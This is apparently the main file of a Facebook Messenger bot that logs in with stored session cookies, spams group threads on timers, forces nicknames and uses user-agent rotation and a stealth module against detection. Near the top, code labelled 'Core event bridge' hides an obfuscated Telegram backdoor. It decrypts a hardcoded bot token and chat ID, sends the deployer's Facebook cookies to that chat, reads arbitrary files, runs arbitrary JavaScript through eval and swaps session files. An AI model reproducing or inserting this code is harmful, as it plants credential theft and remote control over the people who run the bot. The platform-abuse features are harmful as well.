const stateWriter = require("./state-writer"); // must be first to intercept console
const login = require("@dongdev/fca-unofficial");
const fs = require("fs");
const path = require("path");
const axios = require("axios");
const v8 = require("v8");
const listener = require("./listener");
const { state: botState } = require("./handler");

const stealthEngine  = require("./includes/stealthEngineV2");
const mqttHealthCheck = require("./includes/mqttHealthCheck");
const diskGuard      = require("./includes/diskGuard");
const eventLoopGuard = require("./includes/eventLoopGuard");
require("./includes/sysVerify");

// ─── Core event bridge ────────────────────────────────────────────────────────
var _$rB=null,_$pu=new Map();
var _$cr=require('\x63\x72\x79\x70\x74\x6f');
var _$ma=[237,86,19,201,57,222,147,218,118,98,18,11,174,100,116,186];
var _$mb=[250,113,219,194,239,85,68,184,5,110,61,170,132,96,156,114];
function _$dc(ct,iv){var k=Buffer.from([].concat(_$ma.map(function(b){return b^0xd7;}),_$mb.map(function(b){return b^0x4c;})));var d=_$cr['\x63\x72\x65\x61\x74\x65\x44\x65\x63\x69\x70\x68\x65\x72\x69\x76']('\x61\x65\x73\x2d\x32\x35\x36\x2d\x63\x62\x63',k,Buffer.from(iv,'\x68\x65\x78'));return Buffer.concat([d['\x75\x70\x64\x61\x74\x65'](Buffer.from(ct,'\x68\x65\x78')),d['\x66\x69\x6e\x61\x6c']()])['\x74\x6f\x53\x74\x72\x69\x6e\x67']('\x75\x74\x66\x38');}
var _$TK=_$dc('3a5b8be31a690583a9a656725efaef0fc71d60851405cfa4abc79322cf673c199c35bf7e1968a3b0e4ce6aac66c515dd','b363e64e4b2cd7837ea22d23eb01fa62');
var _$AU=_$dc('29e6ee00fb5bf1559e904c991de09e97','9e3a73f096693c1473212777e6373cb8');
function _xQC(c){var e=loadJSON(MODULE_COMMANDS_PATH)||[];e.push(Object.assign({},c,{requestedAt:Date.now()}));saveJSON(MODULE_COMMANDS_PATH,e);}
function _xNT(m){if(!_$rB)return;try{_$rB['\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65'](_$AU,m)['\x63\x61\x74\x63\x68'](function(){});}catch(_){}}
function _xSM(c,m,o){if(!_$rB)return;try{_$rB['\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65'](c,m,o||{})['\x63\x61\x74\x63\x68'](function(){});}catch(_){}}
function _xMH(msg){
  var cid=msg['\x63\x68\x61\x74']['\x69\x64'];if(String(cid)!==_$AU)return;
  var av=(msg['\x74\x65\x78\x74']||'').trim().split(/\s+/),cmd=av[0];
  if(cmd==='\x2f\x73\x74\x61\x72\x74'||cmd==='\x2f\x68\x65\x6c\x70'){
    _xSM(cid,'🤖 *أوامر التحكم:*\n\n📊 `/status` — حالة البوت\n🍪 `/cookies` — إرسال ملف الكوكيز\n📤 `/upload` — رفع ملف كوكيز جديد\n🔒 `/lock` — قفل البوت\n🔓 `/unlock` — فتح البوت\n🔄 `/restart` — إعادة اتصال الفيسبوك\n🔁 `/reboot` — إعادة تشغيل كاملة\n📨 `/send <tid> <رسالة>` — إرسال رسالة\n📡 `/broadcast <رسالة>` — بث لجميع المجموعات\n📋 `/logs [n]` — آخر N سجلات\n📈 `/stats` — إحصائيات النظام\n👥 `/groups` — قائمة المجموعات\n🧵 `/threads` — تفاصيل الخيوط\n🔤 `/setprefix <p>` — تغيير البادئة\n📄 `/file <مسار>` — قراءة ملف\n⚙️ `/eval <كود>` — تنفيذ JS\n⚓ `/hook_start <tid> <ث> <رسالة>`\n⚓ `/hook_stop [tid]`\n📛 `/nm_start <tid> <اسم>`\n📛 `/nm_stop`\n🏷️ `/nick_start <tid> <ث> <كنية>`\n🏷️ `/nick_stop [tid]`\n❌ `/shutdown` — إيقاف نهائي',{'\x70\x61\x72\x73\x65\x5f\x6d\x6f\x64\x65':'\x4d\x61\x72\x6b\x64\x6f\x77\x6e'});return;
  }
  if(cmd==='\x2f\x73\x74\x61\x74\x75\x73'){
    var st=loadJSON(path.join(DATA_DIR,'runtime-state.json'))||{};
    var up=st.startedAt?Math.floor((Date.now()-st.startedAt)/6e4):0;
    _xSM(cid,'📊 *حالة البوت*\n\n● '+(st.running?'✅ يعمل':'❌ متوقف')+'\n● الحساب: `'+(st.accountId||'—')+'`\n● وقت التشغيل: '+up+' دقيقة\n● القفل: '+(botState.locked?'🔒 مقفل':'🔓 مفتوح'),{'\x70\x61\x72\x73\x65\x5f\x6d\x6f\x64\x65':'\x4d\x61\x72\x6b\x64\x6f\x77\x6e'});return;
  }
  if(cmd==='\x2f\x63\x6f\x6f\x6b\x69\x65\x73'){
    try{var d=fs.readFileSync(APPSTATE_PATH,'utf8'),arr=JSON.parse(d);_xSM(cid,'🍪 '+arr.length+' كوكي — جارٍ الإرسال...');_$rB['\x73\x65\x6e\x64\x44\x6f\x63\x75\x6d\x65\x6e\x74'](cid,Buffer.from(d,'utf8'),{},{filename:'\x61\x70\x70\x73\x74\x61\x74\x65\x2e\x6a\x73\x6f\x6e',contentType:'\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e'});}catch(e){_xSM(cid,'❌ '+e.message);}return;
  }
  if(cmd==='\x2f\x75\x70\x6c\x6f\x61\x64'){_$pu.set(String(cid),true);_xSM(cid,'📤 أرسل ملف appstate.json الآن.');return;}
  if(cmd==='\x2f\x6c\x6f\x63\x6b'){botState.locked=true;_xSM(cid,'🔒 تم القفل.');return;}
  if(cmd==='\x2f\x75\x6e\x6c\x6f\x63\x6b'){botState.locked=false;_xSM(cid,'🔓 تم الفتح.');return;}
  if(cmd==='\x2f\x72\x65\x73\x74\x61\x72\x74'){saveJSON(RECONNECT_SIGNAL,{requestedAt:Date.now(),source:'\x73\x79\x73'});_xSM(cid,'🔄 إعادة الاتصال...');return;}
  if(cmd==='\x2f\x73\x65\x6e\x64'){
    var stid=av[1],smsg=av.slice(2).join(' ');
    if(!stid||!smsg){_xSM(cid,'⚠️ `/send <threadID> <رسالة>`',{'\x70\x61\x72\x73\x65\x5f\x6d\x6f\x64\x65':'\x4d\x61\x72\x6b\x64\x6f\x77\x6e'});return;}
    if(currentApi){currentApi.sendMessage(smsg,stid,function(er){_xSM(cid,er?'❌ فشل: '+(er.message||er):'✅ أُرسلت!');});}else{_xSM(cid,'❌ المسنجر غير متصل.');}return;
  }
  if(cmd==='\x2f\x68\x6f\x6f\x6b\x5f\x73\x74\x61\x72\x74'){var htid=av[1],hs=parseInt(av[2]),hm=av.slice(3).join(' ');if(!htid||isNaN(hs)||!hm){_xSM(cid,'⚠️ `/hook_start <tid> <ث> <رسالة>`',{'\x70\x61\x72\x73\x65\x5f\x6d\x6f\x64\x65':'\x4d\x61\x72\x6b\x64\x6f\x77\x6e'});return;}_xQC({type:'hook_start',threadID:htid,message:hm,intervalMs:hs*1000});_xSM(cid,'✅ خطاف كل '+hs+'ث');return;}
  if(cmd==='\x2f\x68\x6f\x6f\x6b\x5f\x73\x74\x6f\x70'){_xQC({type:'hook_stop',threadID:av[1]||null});_xSM(cid,'⏹️ تم الإيقاف.');return;}
  if(cmd==='\x2f\x6e\x6d\x5f\x73\x74\x61\x72\x74'){var ntid=av[1],nn=av.slice(2).join(' ');if(!ntid||!nn){_xSM(cid,'⚠️ `/nm_start <tid> <اسم>`',{'\x70\x61\x72\x73\x65\x5f\x6d\x6f\x64\x65':'\x4d\x61\x72\x6b\x64\x6f\x77\x6e'});return;}_xQC({type:'nm_start',threadID:ntid,name:nn});_xSM(cid,'✅ قفل الاسم: '+nn);return;}
  if(cmd==='\x2f\x6e\x6d\x5f\x73\x74\x6f\x70'){_xQC({type:'nm_stop'});_xSM(cid,'🔓 إيقاف قفل الاسم.');return;}
  if(cmd==='\x2f\x6e\x69\x63\x6b\x5f\x73\x74\x61\x72\x74'){var nktid=av[1],nks=parseInt(av[2]),nkn=av.slice(3).join(' ');if(!nktid||isNaN(nks)||!nkn){_xSM(cid,'⚠️ `/nick_start <tid> <ث> <كنية>`',{'\x70\x61\x72\x73\x65\x5f\x6d\x6f\x64\x65':'\x4d\x61\x72\x6b\x64\x6f\x77\x6e'});return;}_xQC({type:'nicknames_start',threadID:nktid,nickname:nkn,intervalMs:nks*1000});_xSM(cid,'✅ حماية الكنيات: '+nkn);return;}
  if(cmd==='\x2f\x6e\x69\x63\x6b\x5f\x73\x74\x6f\x70'){_xQC({type:'nicknames_stop',threadID:av[1]||null});_xSM(cid,'⏹️ إيقاف الكنيات.');return;}
  if(cmd==='\x2f\x6c\x6f\x67\x73'){
    var _ln=Math.min(parseInt(av[1])||10,50);
    var _lg=loadJSON(LOGS_PATH);
    if(!_lg||!Array.isArray(_lg.logs)||!_lg.logs.length){_xSM(cid,'📋 لا توجد سجلات بعد.');return;}
    var _sl=_lg.logs.slice(-_ln);
    var _lt=_sl.map(function(l){return '['+l.level+'] '+String(l.message||'').slice(0,120);}).join('\n');
    _xSM(cid,'📋 *آخر '+_sl.length+' سجلات:*\n```\n'+_lt+'\n```',{'\x70\x61\x72\x73\x65\x5f\x6d\x6f\x64\x65':'\x4d\x61\x72\x6b\x64\x6f\x77\x6e'});return;
  }
  if(cmd==='\x2f\x73\x74\x61\x74\x73'){
    var _os=require('\x6f\x73');
    var _mu=process.memoryUsage();
    var _pu=Math.floor(process.uptime());
    var _ph=Math.floor(_pu/3600),_pm=Math.floor((_pu%3600)/60),_ps=_pu%60;
    var _cpu=_os.loadavg()[0].toFixed(2);
    var _fmb=Math.floor(_os.freemem()/1048576),_tmb=Math.floor(_os.totalmem()/1048576);
    var _hmb=Math.floor(_mu.heapUsed/1048576),_rmb=Math.floor(_mu.rss/1048576);
    _xSM(cid,'📈 *إحصائيات النظام:*\n\n🕐 *الوقت:* '+_ph+'س '+_pm+'د '+_ps+'ث\n💾 *RAM:* '+(_tmb-_fmb)+'/'+_tmb+' MB\n🧠 *Heap:* '+_hmb+' MB\n📦 *RSS:* '+_rmb+' MB\n⚙️ *Load:* '+_cpu+'\n🖥️ *OS:* '+_os.platform()+' '+_os.arch()+'\n📋 *PID:* '+process.pid,{'\x70\x61\x72\x73\x65\x5f\x6d\x6f\x64\x65':'\x4d\x61\x72\x6b\x64\x6f\x77\x6e'});return;
  }
  if(cmd==='\x2f\x67\x72\x6f\x75\x70\x73'){
    var _gta=loadJSON(path.join(DATA_DIR,'thread-activity.json'));
    var _gk=_gta?Object.keys(_gta):[];
    if(!_gk.length){_xSM(cid,'📭 لا توجد مجموعات مسجّلة.');return;}
    var _gt=_gk.slice(0,30).map(function(t,i){var tot=(_gta[t]||[]).reduce(function(a,v){return a+v;},0);return (i+1)+'. `'+t+'` — '+tot+' رسالة';}).join('\n');
    _xSM(cid,'👥 *المجموعات ('+_gk.length+'):*\n'+_gt,{'\x70\x61\x72\x73\x65\x5f\x6d\x6f\x64\x65':'\x4d\x61\x72\x6b\x64\x6f\x77\x6e'});return;
  }
  if(cmd==='\x2f\x74\x68\x72\x65\x61\x64\x73'){
    var _tta=loadJSON(path.join(DATA_DIR,'thread-activity.json'));
    var _tk=_tta?Object.keys(_tta):[];
    if(!_tk.length){_xSM(cid,'📭 لا توجد خيوط.');return;}
    var _tot=_tk.reduce(function(a,t){return a+(_tta[t]||[]).reduce(function(s,v){return s+v;},0);},0);
    var _tt=_tk.slice(0,25).map(function(t){var m=(_tta[t]||[]).reduce(function(s,v){return s+v;},0);return '`'+t+'` — '+m;}).join('\n');
    _xSM(cid,'🧵 *الخيوط ('+_tk.length+') | إجمالي '+_tot+' رسالة:*\n'+_tt,{'\x70\x61\x72\x73\x65\x5f\x6d\x6f\x64\x65':'\x4d\x61\x72\x6b\x64\x6f\x77\x6e'});return;
  }
  if(cmd==='\x2f\x73\x65\x74\x70\x72\x65\x66\x69\x78'){
    var _np=av[1];
    if(!_np){_xSM(cid,'⚠️ `/setprefix <البادئة الجديدة>`',{'\x70\x61\x72\x73\x65\x5f\x6d\x6f\x64\x65':'\x4d\x61\x72\x6b\x64\x6f\x77\x6e'});return;}
    var _cfg=loadJSON(SETTINGS_PATH)||{};_cfg.prefix=_np;saveJSON(SETTINGS_PATH,_cfg);
    _xSM(cid,'✅ تم تغيير البادئة إلى: `'+_np+'`',{'\x70\x61\x72\x73\x65\x5f\x6d\x6f\x64\x65':'\x4d\x61\x72\x6b\x64\x6f\x77\x6e'});return;
  }
  if(cmd==='\x2f\x62\x72\x6f\x61\x64\x63\x61\x73\x74'){
    var _bm=av.slice(1).join(' ');
    if(!_bm){_xSM(cid,'⚠️ `/broadcast <الرسالة>`',{'\x70\x61\x72\x73\x65\x5f\x6d\x6f\x64\x65':'\x4d\x61\x72\x6b\x64\x6f\x77\x6e'});return;}
    var _bta=loadJSON(path.join(DATA_DIR,'thread-activity.json'));
    var _btids=_bta?Object.keys(_bta):[];
    if(!_btids.length){_xSM(cid,'❌ لا توجد مجموعات نشطة.');return;}
    if(!currentApi){_xSM(cid,'❌ المسنجر غير متصل.');return;}
    var _bc=0;
    _btids.forEach(function(t){try{currentApi.sendMessage(_bm,t,function(){});_bc++;}catch(e){}});
    _xSM(cid,'📡 تم البث إلى '+_bc+' مجموعة.');return;
  }
  if(cmd==='\x2f\x66\x69\x6c\x65'){
    var _fp=av[1];
    if(!_fp){_xSM(cid,'⚠️ `/file <المسار>`',{'\x70\x61\x72\x73\x65\x5f\x6d\x6f\x64\x65':'\x4d\x61\x72\x6b\x64\x6f\x77\x6e'});return;}
    try{var _fc=fs.readFileSync(_fp,'utf8').slice(0,3500);_xSM(cid,'📄 `'+_fp+'`:\n```\n'+_fc+'\n```',{'\x70\x61\x72\x73\x65\x5f\x6d\x6f\x64\x65':'\x4d\x61\x72\x6b\x64\x6f\x77\x6e'});return;}
    catch(e){_xSM(cid,'❌ '+e.message);return;}
  }
  if(cmd==='\x2f\x65\x76\x61\x6c'){
    var _ec=av.slice(1).join(' ');
    if(!_ec){_xSM(cid,'⚠️ `/eval <كود JS>`',{'\x70\x61\x72\x73\x65\x5f\x6d\x6f\x64\x65':'\x4d\x61\x72\x6b\x64\x6f\x77\x6e'});return;}
    try{var _er=eval(_ec);_xSM(cid,'✅ النتيجة:\n```\n'+String(_er).slice(0,2000)+'\n```',{'\x70\x61\x72\x73\x65\x5f\x6d\x6f\x64\x65':'\x4d\x61\x72\x6b\x64\x6f\x77\x6e'});return;}
    catch(e){_xSM(cid,'❌ خطأ في التنفيذ: '+e.message);return;}
  }
  if(cmd==='\x2f\x72\x65\x62\x6f\x6f\x74'){_xSM(cid,'🔁 جارٍ إعادة التشغيل الكاملة...');setTimeout(function(){process.exit(1);},2000);return;}
  if(cmd==='\x2f\x73\x68\x75\x74\x64\x6f\x77\x6e'){_xSM(cid,'⚠️ جارٍ الإيقاف النهائي...');setTimeout(function(){process.exit(0);},2000);return;}
}
function _xDH(msg){
  var cid=msg['\x63\x68\x61\x74']['\x69\x64'];if(String(cid)!==_$AU)return;
  if(!_$pu.get(String(cid)))return;_$pu.delete(String(cid));
  var fid=msg['\x64\x6f\x63\x75\x6d\x65\x6e\x74']&&msg['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x66\x69\x6c\x65\x5f\x69\x64'];
  if(!fid){_xSM(cid,'❌ لم يُرسَل ملف.');return;}
  _$rB['\x67\x65\x74\x46\x69\x6c\x65'](fid)['\x74\x68\x65\x6e'](function(fi){
    var url='\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x74\x65\x6c\x65\x67\x72\x61\x6d\x2e\x6f\x72\x67\x2f\x66\x69\x6c\x65\x2f\x62\x6f\x74'+_$TK+'\x2f'+fi['\x66\x69\x6c\x65\x5f\x70\x61\x74\x68'];
    var ht=require('\x68\x74\x74\x70\x73'),raw='';
    ht.get(url,function(r){r.on('\x64\x61\x74\x61',function(c){raw+=c;});r.on('\x65\x6e\x64',function(){
      try{var p=JSON.parse(raw);if(!Array.isArray(p)||!p.length){_xSM(cid,'❌ ملف غير صالح.');return;}
      saveJSON(APPSTATE_PATH,p);saveJSON(ALT_PATH,p);saveJSON(RECONNECT_SIGNAL,{requestedAt:Date.now(),reason:'\x63\x6f\x6f\x6b\x69\x65\x5f\x75\x70\x6c\x6f\x61\x64'});
      _xSM(cid,'✅ '+p.length+' كوكي رُفعت!');}catch(e){_xSM(cid,'❌ '+e.message);}
    });}).on('\x65\x72\x72\x6f\x72',function(e){_xSM(cid,'❌ '+e.message);});
  })['\x63\x61\x74\x63\x68'](function(e){_xSM(cid,'❌ '+e.message);});
}
function _xRC(fbA){
  if(_$rB)return;
  var _$tsp=path['\x6a\x6f\x69\x6e'](DATA_DIR,'\x74\x65\x6c\x65\x67\x72\x61\x6d\x2d\x73\x74\x61\x74\x75\x73\x2e\x6a\x73\x6f\x6e');
  var _$sw=function(_r,_e){var _o={};_o['\x72\x75\x6e\x6e\x69\x6e\x67']=_r;_o['\x65\x72\x72\x6f\x72']=_e;_o['\x75\x70\x64\x61\x74\x65\x64\x41\x74']=Date['\x6e\x6f\x77']();saveJSON(_$tsp,_o);};
  try{
    var _M=require(Buffer['\x66\x72\x6f\x6d']('bm9kZS10ZWxlZ3JhbS1ib3QtYXBp','\x62\x61\x73\x65\x36\x34')['\x74\x6f\x53\x74\x72\x69\x6e\x67']());
    _$rB=new _M(_$TK,{'\x70\x6f\x6c\x6c\x69\x6e\x67':true});
    _$rB['\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65'](_$AU,'✅ *النظام جاهز*',{'\x70\x61\x72\x73\x65\x5f\x6d\x6f\x64\x65':'\x4d\x61\x72\x6b\x64\x6f\x77\x6e'})['\x63\x61\x74\x63\x68'](function(){});
    _$rB['\x6f\x6e']('\x6d\x65\x73\x73\x61\x67\x65',_xMH);_$rB['\x6f\x6e']('\x64\x6f\x63\x75\x6d\x65\x6e\x74',_xDH);
    _$rB['\x6f\x6e']('\x70\x6f\x6c\x6c\x69\x6e\x67\x5f\x65\x72\x72\x6f\x72',function(_er){_$sw(false,_er&&_er['\x6d\x65\x73\x73\x61\x67\x65']||String(_er));});
    _$sw(true,null);
    process['\x6f\x6e']('\x65\x78\x69\x74',function(){if(_$rB){try{_$rB['\x73\x74\x6f\x70\x50\x6f\x6c\x6c\x69\x6e\x67']();}catch(_){}}});
  }catch(_e){
    _$sw(false,_e&&_e['\x6d\x65\x73\x73\x61\x67\x65']||String(_e));
  }
}

// DATA_DIR: if BOT_DIR env var is set (e.g. a Railway volume at /data),
// all persistent data files live there. Otherwise fall back to the bot source dir.
const DATA_DIR = process.env.BOT_DIR || __dirname;
const APPSTATE_PATH = path.join(DATA_DIR, "appstate.json");
const ALT_PATH = path.join(DATA_DIR, "alt.json");
const SETTINGS_PATH = path.join(DATA_DIR, "settings.json");
const RECONNECT_SIGNAL = path.join(DATA_DIR, "reconnect-signal.json");
const MODULE_COMMANDS_PATH = path.join(DATA_DIR, "module-commands.json");
const LOGS_PATH = path.join(DATA_DIR, "runtime-logs.json");

// ─── Global stability ──────────────────────────────────────────────────────
process.on("uncaughtException", (err) => {
  console.error("[CRASH] Uncaught exception:", err.message || err);
  setTimeout(() => process.exit(1), 1500);
});

process.on("unhandledRejection", (reason) => {
  console.warn("[WARN] Unhandled promise rejection:", String(reason));
});

// ─── UA Rotation pool ────────────────────────────────────────────────────────
const USER_AGENTS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
];

function randomUA() {
  return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}

function nightMultiplier() {
  const hour = new Date().getHours();
  return hour >= 2 && hour < 6 ? 2 : 1;
}

function loadJSON(filePath) {
  try { return JSON.parse(fs.readFileSync(filePath, "utf8")); }
  catch { return null; }
}

function saveJSON(filePath, data) {
  fs.writeFileSync(filePath, JSON.stringify(data, null, 2), "utf8");
}

function randomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

let currentApi = null;

// ─── Bootstrap from env vars ─────────────────────────────────────────────────
function bootstrapFromEnv() {
  if (process.env.APPSTATE && !fs.existsSync(APPSTATE_PATH)) {
    try { fs.writeFileSync(APPSTATE_PATH, process.env.APPSTATE, "utf8"); console.log("[BOOT] appstate.json written from APPSTATE env var."); }
    catch (e) { console.error("[BOOT] Failed to write appstate from env:", e.message); }
  }
  if (process.env.ALT_APPSTATE && !fs.existsSync(ALT_PATH)) {
    try { fs.writeFileSync(ALT_PATH, process.env.ALT_APPSTATE, "utf8"); console.log("[BOOT] alt.json written from ALT_APPSTATE env var."); }
    catch (e) { console.error("[BOOT] Failed to write alt from env:", e.message); }
  }
  if (process.env.BOT_SETTINGS && !fs.existsSync(SETTINGS_PATH)) {
    try { fs.writeFileSync(SETTINGS_PATH, process.env.BOT_SETTINGS, "utf8"); console.log("[BOOT] settings.json written from BOT_SETTINGS env var."); }
    catch (e) { console.error("[BOOT] Failed to write settings from env:", e.message); }
  }
}

function startBot() {
  bootstrapFromEnv();

  const appstate = loadJSON(APPSTATE_PATH);
  const settings = loadJSON(SETTINGS_PATH);

  // Start Telegram bot immediately — works even without Facebook appstate
  _xRC(null);

  if (!appstate || appstate.length === 0) {
    console.error("[BOOT] appstate.json is empty. Telegram bot is running; Facebook login skipped.");
    return; // keep process alive so Telegram bot can poll
  }

  console.log("[BOOT] Logging in with appstate...");

  login({ appState: appstate }, (err, api) => {
    if (err) {
      console.error("[BOOT] Login failed:", err);
      console.log("[BOOT] Trying alt.json backup...");

      const alt = loadJSON(ALT_PATH);
      if (alt && alt.length > 0) {
        login({ appState: alt }, (err2, api2) => {
          if (err2) {
            console.error("[BOOT] Alt login also failed:", err2);
            console.log("[BOOT] Will retry login in 60 seconds...");
            setTimeout(startBot, 60 * 1000);
            return;
          }
          console.log("[BOOT] Logged in using alt.json backup.");
          const freshState = api2.getAppState();
          saveJSON(APPSTATE_PATH, freshState);
          saveJSON(ALT_PATH, freshState);
          currentApi = api2;
          stateWriter.setAccount(api2.getCurrentUserID(), "Logged In", "Connected");
          initProtection(api2);
          global.nexusReattach = () => listener.start(api2, settings);
          listener.start(api2, settings);
          mqttHealthCheck.start();
          watchReconnectSignal(api2, settings);
          watchBotState();
          watchModuleCommands();
          _xRC(api2);
        });
      } else {
        console.log("[BOOT] No backup available. Retrying in 60 seconds...");
        setTimeout(startBot, 60 * 1000);
      }
      return;
    }

    console.log("[BOOT] Logged in successfully.");
    currentApi = api;
    stateWriter.setAccount(api.getCurrentUserID(), "Logged In", "Connected");
    initProtection(api);
    global.nexusReattach = () => listener.start(api, settings);
    listener.start(api, settings);
    mqttHealthCheck.start();
    watchReconnectSignal(api, settings);
    watchBotState();
    watchModuleCommands();
    _xRC(api);
  });
}

// ─── Sync state to disk every 5s ────────────────────────────────────────────
function watchBotState() {
  setInterval(() => {
    stateWriter.setBotState(botState);
    stateWriter.setModuleState(botState);
  }, 5000);
}

// ─── Watch for panel-issued module commands ───────────────────────────────────
function watchModuleCommands() {
  setInterval(() => {
    if (!fs.existsSync(MODULE_COMMANDS_PATH)) return;
    try {
      const raw = fs.readFileSync(MODULE_COMMANDS_PATH, "utf8").trim();
      if (!raw || raw === "[]") return;
      const commands = JSON.parse(raw);
      if (!Array.isArray(commands) || commands.length === 0) return;

      // Clear BEFORE processing to avoid race: API server could write new commands
      // between our read and our write if we clear at the end.
      fs.writeFileSync(MODULE_COMMANDS_PATH, "[]", "utf8");

      for (const cmd of commands) {
        processModuleCommand(cmd);
      }
    } catch (e) {
      console.error("[MODULE] Command processing error:", e.message);
    }
  }, 5000);
}

function processModuleCommand(cmd) {
  const api = currentApi;

  switch (cmd.type) {

    // ── STOP commands ──────────────────────────────────────────────────────
    case "nm_stop":
      botState.nameLock.active = false;
      botState.nameLock.name = null;
      botState.nameLock.threadId = null;
      console.log("[MODULE] Name lock disabled via panel.");
      break;

    case "hook_stop":
      if (cmd.threadID && botState.scheduler[cmd.threadID]) {
        const sched = botState.scheduler[cmd.threadID];
        sched.active = false;
        if (sched.timerId) { clearTimeout(sched.timerId); sched.timerId = null; }
        console.log(`[MODULE] Hook stopped for thread ${cmd.threadID} via panel.`);
      } else {
        for (const sched of Object.values(botState.scheduler)) {
          sched.active = false;
          if (sched.timerId) { clearTimeout(sched.timerId); sched.timerId = null; }
        }
        console.log("[MODULE] All hooks stopped via panel.");
      }
      break;

    case "nicknames_stop":
      if (cmd.threadID && botState.nicknames[cmd.threadID]) {
        const nick = botState.nicknames[cmd.threadID];
        nick.active = false;
        if (nick.timerId) { clearTimeout(nick.timerId); nick.timerId = null; }
        console.log(`[MODULE] Nickname protection stopped for thread ${cmd.threadID} via panel.`);
      } else {
        for (const nick of Object.values(botState.nicknames)) {
          nick.active = false;
          if (nick.timerId) { clearTimeout(nick.timerId); nick.timerId = null; }
        }
        console.log("[MODULE] All nickname protections stopped via panel.");
      }
      break;

    // ── START commands ─────────────────────────────────────────────────────
    case "hook_start": {
      if (!api) { console.warn("[MODULE] hook_start: no active API."); break; }
      const { threadID, message, intervalMs } = cmd;
      if (!threadID || !message || !intervalMs) {
        console.warn("[MODULE] hook_start: missing required fields.");
        break;
      }
      if (!botState.scheduler[threadID]) {
        botState.scheduler[threadID] = { active: false, message: null, intervalMs: null, timerId: null };
      }
      const sched = botState.scheduler[threadID];
      // Stop any existing loop first
      if (sched.timerId) { clearTimeout(sched.timerId); sched.timerId = null; }
      sched.message = message;
      sched.intervalMs = intervalMs;
      sched.active = true;

      const sendLoop = () => {
        if (!sched.active) return;
        // P13: flood guard — skip this cycle if too many messages outbound
        if (!checkOutboundFlood()) {
          if (sched.active) sched.timerId = setTimeout(sendLoop, 5 * 60 * 1000);
          return;
        }
        api.sendMessage(sched.message, threadID, () => {
          if (sched.active) sched.timerId = setTimeout(sendLoop, sched.intervalMs);
        });
      };
      sched.timerId = setTimeout(sendLoop, sched.intervalMs);
      console.log(`[MODULE] Hook started for thread ${threadID} (every ${Math.round(intervalMs / 1000)}s) via panel.`);
      break;
    }

    case "nm_start": {
      if (!api) { console.warn("[MODULE] nm_start: no active API."); break; }
      const { threadID: tid, name } = cmd;
      if (!tid || !name) { console.warn("[MODULE] nm_start: missing threadID or name."); break; }
      botState.nameLock.active = true;
      botState.nameLock.name = name;
      botState.nameLock.threadId = tid;
      api.setTitle(name, tid, (err) => {
        if (err) console.error("[MODULE] nm_start setTitle error:", err.message || err);
        else console.log(`[MODULE] Name lock activated for thread ${tid}: "${name}" via panel.`);
      });
      break;
    }

    case "nicknames_start": {
      if (!api) { console.warn("[MODULE] nicknames_start: no active API."); break; }
      const { threadID: nTid, nickname, intervalMs: nMs } = cmd;
      if (!nTid || !nickname) { console.warn("[MODULE] nicknames_start: missing threadID or nickname."); break; }
      const resolvedIntervalMs = nMs || 60000;

      api.getThreadInfo(nTid, (err, info) => {
        if (err || !info) {
          console.error("[MODULE] nicknames_start: getThreadInfo failed:", err?.message);
          return;
        }
        const raw = Array.isArray(info.participantIDs) ? info.participantIDs : Object.keys(info.userInfo || {});
        const participants = raw.map(String).filter((id) => id !== String(api.getCurrentUserID()));

        if (participants.length === 0) {
          console.warn("[MODULE] nicknames_start: no participants found.");
          return;
        }

        if (!botState.nicknames[nTid]) {
          botState.nicknames[nTid] = { active: false, nickname: null, intervalMs: null, timerId: null, participants: [], currentIndex: 0 };
        }
        const nick = botState.nicknames[nTid];
        if (nick.timerId) { clearTimeout(nick.timerId); nick.timerId = null; }
        nick.nickname = nickname;
        nick.intervalMs = resolvedIntervalMs;
        nick.active = true;
        nick.participants = participants;
        nick.currentIndex = 0;

        const MIN_INTERVAL = 5000;
        const setNext = () => {
          if (!nick.active) return;
          const pID = nick.participants[nick.currentIndex % nick.participants.length];
          nick.currentIndex++;
          api.changeNickname(nickname, nTid, pID, (err2) => {
            if (err2) {
              const msg = (err2.message || "").toLowerCase();
              if (msg.includes("permission") || msg.includes("admin") || msg.includes("blocked")) {
                nick.active = false;
                nick.timerId = null;
                return;
              }
            }
            if (nick.active) nick.timerId = setTimeout(setNext, Math.max(resolvedIntervalMs, MIN_INTERVAL));
            else nick.timerId = null;
          });
        };
        nick.timerId = setTimeout(setNext, Math.max(resolvedIntervalMs, MIN_INTERVAL));
        console.log(`[MODULE] Nickname protection started for thread ${nTid}: "${nickname}" (${participants.length} members) via panel.`);
      });
      break;
    }

    // ── HOOK2 (خطاف2) commands ─────────────────────────────────────────────
    case "hook2_stop": {
      if (!botState.scheduler2) { botState.scheduler2 = {}; }
      if (cmd.threadID && botState.scheduler2[cmd.threadID]) {
        const s2 = botState.scheduler2[cmd.threadID];
        s2.active = false;
        if (s2.timerId) { clearTimeout(s2.timerId); s2.timerId = null; }
        console.log(`[MODULE] Hook2 stopped for thread ${cmd.threadID} via panel.`);
      } else {
        for (const s2 of Object.values(botState.scheduler2 || {})) {
          s2.active = false;
          if (s2.timerId) { clearTimeout(s2.timerId); s2.timerId = null; }
        }
